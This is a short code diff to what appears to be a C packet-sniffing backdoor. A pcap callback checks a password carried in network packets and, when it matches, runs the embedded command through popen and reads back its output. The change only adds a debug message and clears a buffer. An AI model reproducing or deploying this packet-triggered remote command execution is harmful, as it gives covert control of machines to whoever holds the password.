@@ -111,6 +111,8 @@ void packet_callback(unsigned char *args, const struct pcap_pkthdr *pkt_header,
 
 	/* run command if we're the server & password matches */
 	if (server && (strcmp(password, PASSWORD) == 0)) {
+		if (print_output)
+			printf("password correct, executing command...\n");
 		/* system(command); */
 		send_command(command);
 	}
@@ -128,6 +130,7 @@ void send_command(char *command)
 		err(1, "popen");
 	}
 
+	memset(buffer, 0x0, sizeof(buffer));
 	read_bytes = fread(buffer, sizeof(char), 524280 - 1, file);
 
 /*	read_bytes = fread(buffer + strlen(PASSWORD) + strlen(EXT_CMD_START),
